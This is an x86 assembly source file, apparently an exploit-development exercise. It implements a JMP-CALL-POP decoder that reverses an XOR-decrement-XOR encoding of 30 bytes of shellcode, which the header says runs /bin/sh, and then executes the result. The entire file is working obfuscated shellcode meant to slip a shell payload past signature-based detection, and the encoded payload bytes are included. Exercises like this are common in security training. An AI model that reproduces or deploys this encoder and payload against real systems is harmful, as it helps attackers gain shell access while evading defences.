; Executable name : decoder
; Version         : 1.0
; Created date    : 04/21/2021
; Last update     : 04/21/2021
; Author          : bigb0ss
; Description     : This is to run XOR-Increment-XOR decode for the "/bin/sh" shellcode
;

global _start

section .text

_start:

    jmp short call_decoder    ; JMP to "call_decoder" 

decoder:

    pop esi                   ; POPing "shellcode" on the ESI register
	xor ecx, ecx		      ; Zero out ECX
	xor edx, edx		      ; Zero out EDX
	mov dl, 30		          ; Move 30 (lengh of shellcode) to c low  
 
decode_loop:
	
	cmp ecx, edx		      ; Check if our loop is done for 30 times
	je encodedshellcode

    xor byte [esi], 0x11      ; 2nd XOR by 0x11
	dec byte [esi]		      ; Decrement by 1
	xor byte [esi], 0x05	  ; 1st XOR by 0x05

	inc esi
	inc ecx	
	jmp short decode_loop

call_decoder:

      call decoder                    ; CALL "decoder"
      encodedshellcode: db 0x24,0xd7,0x47,0x7f,0x79,0x74,0x66,0x7f,0x7f,0x79,0x7c,0x7d,0x3a,0x7f,0x3a,0x3a,0x3a,0x3a,0x9c,0xf6,0x47,0x9c,0xf9,0x46,0x9c,0xf4,0xa7,0x1e,0xd8,0x97 